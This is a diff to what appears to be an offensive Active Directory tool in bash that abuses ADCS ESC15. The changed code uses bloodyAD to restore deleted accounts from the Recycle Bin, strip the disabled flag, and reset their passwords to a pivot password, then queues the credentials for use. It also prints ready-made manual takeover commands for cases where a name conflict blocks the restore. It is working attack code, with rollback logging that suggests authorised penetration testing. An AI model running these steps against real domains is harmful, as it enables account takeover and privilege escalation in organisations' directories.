@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.17.0"
+readonly VERSION="1.17.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1854,16 +1854,24 @@ _adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
         rec="${DELETED_SID[${sid,,}]:-}"; [[ -z "$rec" ]] && continue
         dn="${rec%%$'\t'*}"; sam="${rec#*$'\t'}"
         [[ -z "$dn" || -z "$sam" ]] && continue
-        warn "ESC15 enroller is a DELETED account: ${C_BOLD}${sam}${C_RESET} (SID ${sid}) → restoring the original"
-        confirm "  Restore deleted enroller '${sam}' from the Recycle Bin?" || continue
-        # name conflict: a same-name account is active (e.g. a different tombstone we
-        # restored earlier) → rename it aside so the real, SID-matching one returns.
-        act=$(bloodyAD "${ba[@]}" get object "$sam" --attr distinguishedName 2>/dev/null | grep -oiP 'distinguishedName:\s*\K.+' | head -1)
-        if [[ -n "$act" && "$act" != "$dn" ]]; then
-            bloodyAD "${ba[@]}" set object "$act" sAMAccountName -v "${sam}_old" 2>&1 | tee -a "$LOGFILE" >/dev/null \
-                && rb_record "Renamed conflicting $sam → ${sam}_old" "bloodyAD ${ba[*]} set object '$act' sAMAccountName -v '$sam'"
+        warn "ESC15 enroller is a DELETED account: ${C_BOLD}${sam}${C_RESET} (SID ${sid})"
+        # If an ACTIVE object already holds this name, restoring the tombstone hits
+        # an RDN conflict (the live object's CN is still '$sam'). We do NOT rename or
+        # delete a live account to force it (that's destructive — it broke a working
+        # pivot before, and renaming sAMAccountName doesn't even clear the RDN). On a
+        # clean domain there's a single tombstone and this restores straight away;
+        # on a polluted Recycle Bin we surface the exact manual step instead.
+        act=$(bloodyAD "${ba[@]}" get object "$sam" --attr objectSid 2>/dev/null | grep -oiP 'objectSid:\s*\K\S+' | head -1)
+        if [[ -n "$act" ]]; then
+            warn "  an active '${sam}' (${act}) already holds the name → not touching it. To finish manually:"
+            detail "      # remove the active ${sam}, then restore the SID-matching tombstone and reset it:"
+            detail "      bloodyAD ${ba[*]} set restore '$dn'"
+            detail "      bloodyAD ${ba[*]} set password '$sam' '$PIVOT_PW'   # then re-run ESC15 as $sam"
+            continue
         fi
-        if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
+        confirm "  Restore deleted enroller '${sam}' (SID ${sid}) from the Recycle Bin?" || continue
+        local rout; rout=$(bloodyAD "${ba[@]}" set restore "$dn" 2>&1); echo "$rout" | tee -a "$LOGFILE"
+        if grep -qiE 'restored|success' <<<"$rout"; then
             rb_record "Restored ADCS enroller $sam ($sid)" "echo 'Manual: re-delete $sam if the client needs it'"
             bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 >/dev/null
             bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'
@@ -1873,7 +1881,7 @@ _adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
             queue_cred "$sam" "$PIVOT_PW" "" "Recycle Bin restore (ADCS enroller)"
             return 0
         fi
-        warn "  could not restore '${sam}'"
+        warn "  could not restore '${sam}' (see log for the bloodyAD error)"
     done
     return 1
 }
@@ -2055,10 +2063,18 @@ phase_recycle_disabled() {
                     fi
                 fi
             done < <(echo "$del" | awk '
+                # When several tombstones share a sAMAccountName (a box reset / re-create
+                # leaves stale duplicates), restore ONLY the highest-RID one — that is the
+                # current account the live ACLs (e.g. an ADCS template enrol) reference;
+                # the lower-RID ones are dead duplicates from older builds.
+                function rid(s,  n,a){ n=split(s,a,"-"); return a[n]+0 }
+                function flush(){ if(dn ~ /DEL:/ && sam!=""){ r=rid(sid);
+                    if(!(sam in brid) || r>brid[sam]){ brid[sam]=r; bdn[sam]=dn } } }
                 /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
                 /^sAMAccountName:/{sam=$0; sub(/^sAMAccountName:[ ]*/,"",sam)}
-                /^[[:space:]]*$/{ if(dn ~ /DEL:/ && sam!="") print dn"\t"sam; dn="";sam="" }
-                END{ if(dn ~ /DEL:/ && sam!="") print dn"\t"sam }')
+                /^objectSid:/{sid=$0; sub(/^objectSid:[ ]*/,"",sid)}
+                /^[[:space:]]*$/{ flush(); dn="";sam="";sid="" }
+                END{ flush(); for(k in bdn) print bdn[k]"\t"k }')
         else
             info "  (report-only; --abuse to restore them)"
         fi
